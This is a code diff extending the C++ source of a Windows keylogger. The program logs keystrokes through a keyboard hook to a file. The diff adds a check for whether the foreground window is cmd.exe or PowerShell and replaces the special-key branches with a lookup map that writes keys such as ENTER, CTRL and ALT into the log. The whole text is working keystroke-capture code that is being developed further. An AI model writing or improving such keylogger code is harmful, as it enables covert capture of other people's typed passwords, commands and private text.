@@ -6,6 +6,33 @@ std::mutex fileMutex;
 HHOOK hKeyboardHook = NULL;
 DWORD hookThreadId = 0;
 
+bool isFromTerminal()
+{
+    HWND foregroundWindow = GetForegroundWindow();
+    if (foregroundWindow == NULL)
+    {
+        return false;
+    }
+
+    DWORD processId;
+    GetWindowThreadProcessId(foregroundWindow, &processId);
+    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+    if (processHandle == NULL)
+    {
+        return false;
+    }
+
+    TCHAR processName[MAX_PATH];
+    if (GetModuleBaseName(processHandle, NULL, processName, sizeof(processName) / sizeof(TCHAR)) > 0)
+    {
+        CloseHandle(processHandle);
+        return _tcscmp(processName, _T("cmd.exe")) == 0 || _tcscmp(processName, _T("powershell.exe")) == 0;
+    }
+
+    CloseHandle(processHandle);
+    return false;
+}
+
 void logKey(DWORD vkCode)
 {
     std::lock_guard<std::mutex> lock(fileMutex);
@@ -15,30 +42,37 @@ void logKey(DWORD vkCode)
         std::cerr << "Failed to open keylogger log file." << std::endl;
         return;
     }
+
+    std::map<DWORD, std::string> specialKeys = {
+        {VK_SPACE, "SPACE"},
+        {VK_RETURN, "ENTER"},
+        {VK_BACK, "BACKSPACE"},
+        {VK_TAB, "TAB"},
+        {VK_SHIFT, "SHIFT"},
+        {VK_CONTROL, "CTRL"},
+        {VK_MENU, "ALT"},
+        {VK_ESCAPE, "ESC"},
+        {VK_DELETE, "DELETE"},
+        {VK_LEFT, "LEFT"},
+        {VK_RIGHT, "RIGHT"},
+        {VK_UP, "UP"},
+        {VK_DOWN, "DOWN"},
+        {VK_CAPITAL, "CAPSLOCK"}
+    };
+
     if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) // Digits && Letters
     {
         logFile << static_cast<char>(vkCode);
     }
-    else if (vkCode == VK_SPACE)
+    else if (specialKeys.count(vkCode))
     {
-        logFile << ' ';
-    }
-    else if (vkCode == VK_RETURN)
-    {
-        logFile << '\n';
-    }
-    else if (vkCode == VK_BACK)
-    {
-        logFile << "[BACKSPACE]";
-    }
-    else if (vkCode == VK_TAB)
-    {
-        logFile << "[TAB]";
+        logFile << "[" << specialKeys[vkCode] << "]";
     }
     else
     {
-        logFile << "[" << vkCode << "]";
+        logFile << "[VK_" << vkCode << "]";
     }
+
     logFile.close();
     std::cout << "Logged key: " << vkCode << std::endl;
 }
